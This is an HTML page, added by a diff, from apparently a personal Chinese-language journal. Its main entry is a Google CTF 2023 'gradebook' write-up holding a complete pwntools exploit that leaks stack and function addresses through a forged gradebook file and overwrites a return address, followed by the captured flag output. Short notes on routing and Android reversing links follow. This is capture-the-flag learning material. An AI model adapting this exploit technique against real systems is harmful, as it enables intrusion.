@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>giacomo&#39;s journal</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+    <link
+    rel="stylesheet"
+    href="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.css"
+    />
+    <script>hljs.highlightAll();</script>
+    <script>hljs.addPlugin(new CopyButtonPlugin());</script>
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery-3.7.1.min.js"></script>
+
+    
+<script src="/js/bootstrap-transition.js"></script>
+
+    
+<script src="/js/zoom.js"></script>
+
+
+    <style>
+        .markdown-body {
+            box-sizing: border-box;
+            min-width: 200px;
+            max-width: 980px;
+            margin-left: 28%;
+            margin-top: 6%;
+
+            padding: 45px;
+        }
+
+        @media (max-width: 767px) {
+            .markdown-body {
+                padding: 15px;
+            }
+        }
+    </style>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <header class="header">
+
+    <div class="navbar-left">
+        <div class="avatar">
+            <a href="/">
+                <img src="https://91ac0m0.github.io/img/avatar.jpg"alt="avatar">
+            </a>
+        </div>
+        <div class="nav-title">
+            <a class="nav-brand" href="/">giacomo</a>
+        </div>
+    </div>
+    <div class="navbar-right">
+        <ul class="nav-links">
+            
+                <div class="nav-link">
+                    <a href="/about" class="menu-item-link">
+                        about
+                    </a>
+                </div>
+            
+        </ul>
+
+    </div>
+    
+
+</header>
+
+    <div class = "toc_left">
+	
+    <div id="toc">
+        <!-- <strong class="sidebar-title">目录</strong> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#gradebook-%E6%89%93%E4%B8%8D%E9%80%9A%E7%9A%84%E5%8E%9F%E5%9B%A0%E6%89%BE%E5%88%B0%E4%BA%86"><span class="toc-text">gradebook 打不通的原因找到了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E8%BA%AB-wifi"><span class="toc-text">随身 wifi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91"><span class="toc-text">安卓逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-text">内网穿透</span></a></li></ol></li></ol>
+    </div>
+
+</div>
+<article class="markdown-body">
+	<div></div><h2 id="gradebook-打不通的原因找到了"><a href="#gradebook-打不通的原因找到了" class="headerlink" title="gradebook 打不通的原因找到了"></a>gradebook 打不通的原因找到了</h2><p>谔谔了，打算放弃了，结果刚爬上床突然想起来，这个 chal 文件是我自己编译的，因为没有在仓库找到二进制文件，然后自己编译的东西栈的排布不太一样 😓</p>
+<p>anyways</p>
+<p>最终的 exp 长这样</p>
+<pre><code class="python">from pwn import *
+
+elf_path = &quot;./chal&quot;
+ip = &quot;gradebook.2023.ctfcompetition.com&quot;
+port = &quot;1337&quot;
+content = 0
+
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
+if content == 1:
+    os.system(&#39;tmux set mouse on&#39;)
+    context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+    # p = process(elf_path)
+    p_fake = process(elf_path)
+    p = gdb.debug(elf_path)
+
+else:
+    p = remote(ip, port)
+    p_fake = remote(ip, port)
+
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+leak = lambda name,addr :log.success(&#39;&#123;&#125; = &#123;:#x&#125;&#39;.format(name, addr))
+
+# ----------------------------------------------------------
+
+# upload a narmal gradebook
+sla(b&#39;PASSWORD:\n&#39;, b&#39;pencil&#39;)
+sla(b&#39;3. QUIT\n\n&#39;, b&#39;2&#39;)
+sla(b&#39;ENTER FILENAME:\n&#39;, b&#39;x&#39;)
+rud(b&#39;GENERATED FILENAME: &#39;)
+file_name = ru(b&#39;ENTER&#39;)[:44].decode()
+f = open(&quot;gradebook&quot;, &quot;rb&quot;)
+file_data = f.read()
+sla(b&#39;FILE SIZE:\n&#39;, str(len(file_data)).encode())
+sa(b&#39;SEND BINARY FILE DATA:\n&#39;,  file_data)
+sla(b&#39;3. QUIT\n\n&#39;, b&#39;1&#39;)
+sla(b&#39;ENTER FILENAME:&#39;, file_name.encode())
+log.success(file_name)
+
+# leak stack_addr
+sla(b&#39;6. QUIT\n\n&#39;, b&#39;1&#39;)
+sla(b&#39;CLASS:\n&#39;, b&#39;1&#39;)
+sla(b&#39;COURSE TITLE:\n&#39;, b&#39;1&#39;)
+sla(b&#39;GRADE:\n&#39;, b&#39;1&#39;)
+sla(b&#39;TEACHER:\n&#39;, b&#39;1&#39;)
+sla(b&#39;ROOM:\n&#39;, b&#39;1&#39;*4)
+sla(b&#39;PERIOD:\n&#39;, b&#39;1&#39;)
+ru(b&#39; 1111     &#39;)
+ret_addr = u64(ru(b&#39;\x7f&#39;).ljust(8, b&#39;\x00&#39;)) + 0x38
+leak(&#39;ret_addr&#39;, ret_addr)
+
+# leak fun_addr
+grade_book = 0x4752ADE50000
+fake_file = file_data[:0x48]
+fake_file += p64(0xffffffffffffffff)
+fake_file += p64(ret_addr - grade_book)
+fake_file += p64(ret_addr - grade_book)
+p_fake.sendlineafter(b&#39;PASSWORD:\n&#39;, b&#39;pencil&#39;)
+p_fake.sendlineafter(b&#39;3. QUIT\n\n&#39;, b&#39;2&#39;)
+p_fake.sendlineafter(b&#39;ENTER FILENAME:\n&#39;, file_name.encode())
+p_fake.sendlineafter(b&#39;ENTER FILE SIZE:\n&#39;, str(len(fake_file)).encode())
+p_fake.sendafter(b&#39;SEND BINARY FILE DATA:\n&#39;,  fake_file)
+sla(b&#39;6. QUIT\n\n&#39;, b&#39;2&#39;)
+sla(b&#39;WHICH GRADE:\n&#39;, b&#39;0&#39;)
+ru(b&#39;\x0a   &#39;)
+fun_addr = u64(rud(b&#39;   &#39;).ljust(8, b&#39;\x00&#39;))
+leak(&#39;fun_addr&#39;, fun_addr)
+
+# change ret addr
+sla(b&#39;6. QUIT\n\n&#39;, b&#39;1&#39;)
+sla(b&#39;CLASS:\n&#39;, p64(fun_addr - 0xc93))
+sla(b&#39;COURSE TITLE:\n&#39;, b&#39;1&#39;)
+sla(b&#39;GRADE:\n&#39;, b&#39;1&#39;)
+sla(b&#39;TEACHER:\n&#39;, b&#39;1&#39;)
+sla(b&#39;ROOM:\n&#39;, b&#39;1&#39;*4)
+sla(b&#39;PERIOD:\n&#39;, b&#39;1&#39;)
+
+p.interactive()
+</code></pre>
+<p>就可以打通了</p>
+<pre><code class="shell">[+] Opening connection to gradebook.2023.ctfcompetition.com on port 1337: Done
+[+] Opening connection to gradebook.2023.ctfcompetition.com on port 1337: Done
+[+] /tmp/grades_041b92931f41f2b08fcb4a5fa0585999
+[+] ret_addr = 0x7ffe07582fe8
+[+] fun_addr = 0x55659d79a386
+[*] Switching to interactive mode
+CTF&#123;mm4p_p4rs1ng_c0nsid3red_h4rmfu1&#125;
+[*] Got EOF while reading in interactive
+</code></pre>
+<h2 id="随身-wifi"><a href="#随身-wifi" class="headerlink" title="随身 wifi"></a>随身 wifi</h2><p>我分到的 ip 11.22.33.44</p>
+<ul>
+<li><p>route add 11.22.00.00 mask 255.255.0.0 wifi 的网关？</p>
+</li>
+<li><p>为什么添加 b 类就可以？</p>
+</li>
+</ul>
+<h2 id="安卓逆向"><a href="#安卓逆向" class="headerlink" title="安卓逆向"></a>安卓逆向</h2><p><a target="_blank" rel="noopener" href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-1/">Android App 逆向入門之一：拆開與重組 apk - Huli’s blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lyxf/p/13617228.html">Android 逆向入门 - i0gan - 博客园</a></p>
+<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps/#/example?id=socks5%e4%bb%a3%e7%90%86">https://ehang-io.github.io/nps/#/example?id=socks5%e4%bb%a3%e7%90%86</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40732354/article/details/99585884">https://blog.csdn.net/qq_40732354/article/details/99585884</a></p>
+</div>
+</article>
+
+<script src="/js/image_pop_up.js"></script>
+
+	
+
+</body>
+</html>
